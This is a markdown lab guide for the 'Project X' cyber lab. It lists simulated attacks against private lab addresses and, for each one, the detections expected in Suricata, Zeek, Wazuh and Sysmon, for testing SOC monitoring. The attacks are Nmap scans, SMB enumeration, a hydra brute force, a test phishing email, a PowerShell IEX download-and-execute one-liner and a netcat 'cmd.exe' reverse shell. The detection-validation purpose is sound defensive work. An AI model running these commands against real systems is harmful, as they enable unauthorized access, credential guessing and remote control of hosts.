# Attack Scenarios & Testing Procedures
This document provides structured offensive security simulations designed to validate detection, monitoring, and response capabilities within the Project X Enterprise Cyber Lab.

These attack scenarios test:
- Network monitoring (Security Onion: Suricata + Zeek)
- Endpoint monitoring (Wazuh + Sysmon)
- Authentication visibility (Windows Event Logs)
- IDS detection capabilities
- SOC analyst workflows

---

# 1. Attack Scenario: Network Reconnaissance (Nmap Scanning)

## Objective
Identify whether active network scanning is detected by Suricata, Zeek, and Wazuh.

## Commands (Run from attacker-kali)

### Basic Scan
```bash
nmap 10.0.0.5
```

### Service Enumeration
```bash
nmap -sV 10.0.0.5
```

### Full Network Sweep
```bash
nmap -A 10.0.0.0/24
```

## Expected Detections
| System | Log/Alert | Explanation |
|--------|-----------|-------------|
| **Suricata** | ET SCAN Nmap OS detection | Suricata recognizes Nmap signatures |
| **Zeek** | conn.log | Connection attempts on multiple ports |
| **Wazuh** | Suricata → Wazuh integration | Alerts forwarded via SO rules |

## SOC Validation Steps
- Check **Security Onion → Alerts**
- Check **Zeek → conn.log**
- Check **Wazuh Dashboard → Security events**

---

# 2. Attack Scenario: SMB Enumeration

## Objective
Detect unauthorized reconnaissance of SMB shares on the Domain Controller.

## Commands (Kali)

```bash
enum4linux -a 10.0.0.5
```

## Expected Detections
| System | Detection |
|--------|-----------|
| Zeek | smb_files.log, smb_cmd.log |
| Suricata | SMB protocol anomalies |
| Windows DC | Failed logons |  
| Wazuh | Authentication failures (multiple) |

---

# 3. Attack Scenario: Password Brute Force

## Objective
Detect brute-force attempts on SMB authentication.

## Commands

```bash
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://10.0.0.5
```

## Expected Detections
- **Windows Event Logs**  
  - Event ID **4625** (failed login)  
  - Event ID **4624** (successful login, if cracked)
- **Wazuh**  
  - Correlation rules for repeated failures  
- **Suricata**  
  - Flag unusual SMB activity  
- **Zeek**  
  - SMB anomalies  

---

# 4. Attack Scenario: Phishing Simulation (Email Delivery)

## Objective
Validate that email delivery is captured for security testing.

## Step 1 — Send Test Email (Kali/Ubuntu)

```bash
python3 test_message.py
```

This uses SMTP → MailHog.

## Step 2 — Validate email
Open:

```
http://10.0.0.8:8025
```

Confirm the phishing message appears.

## Expected Detections
- **Wazuh** logs SMTP activity from Linux host  
- **MailHog** captures email  
- **Security Onion** captures SMTP traffic metadata  

---

# 5. Attack Scenario: Suspicious PowerShell Execution

## Objective
Detect malicious PowerShell usage on Windows.

## Command (Windows Client)

```powershell
Invoke-WebRequest http://10.0.0.8/malicious.ps1 -OutFile payload.ps1
```

Or spawn a reverse shell (example):

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.8/rev.ps1')
```

## Expected Detections
| System | Event |
|--------|--------|
| Sysmon | Event ID **1** (Process Create) |
| Wazuh | Suspicious PowerShell rule triggers |
| Security Onion | HTTP download activity |

---

# 6. Attack Scenario: Reverse Shell Attempt

## Objective
Detect C2-style reverse shell activity.

## Step 1 — Listener on Kali
```bash
nc -nlvp 4444
```

## Step 2 — Victim connection (Windows Client)
```powershell
nc.exe 10.0.0.150 4444 -e cmd.exe
```

## Expected Detections
| System | Detection |
|--------|-----------|
| Suricata | Reverse shell signatures |
| Zeek | Unusual connection patterns |
| Wazuh | Suspicious outbound traffic |

---

# 7. Attack Scenario: Web Exploitation Testing

Test IIS on the Domain Controller.

## Example Scan
```bash
nikto -h http://10.0.0.5
```

## Expected Detections
- Suricata → HTTP exploit attempt signatures  
- Zeek → http.log entries  
- Wazuh → Web server logs (forwarded through agent)  

---

# 8. Validation Checklist

| Scenario | Expected Outcome |
|----------|-------------------|
| Nmap Scan | Suricata + Zeek detect scanning |
| SMB Enum | Zeek shows SMB logs |
| Brute Force | 4625 events + Wazuh alerts |
| Phishing Test | MailHog captures |  
| PowerShell Abuse | Sysmon + Wazuh alerts |  
| Reverse Shell | Suricata triggers |  
| Web Recon | HTTP alerts fire |  

---

# 9. SOC Analyst Workflow (Optional Add-On)

For each attack:
- Identify alerts in Security Onion  
- Correlate with host logs in Wazuh  
- Document timeline  
- Construct an incident ticket (if simulating SOC workflow)  
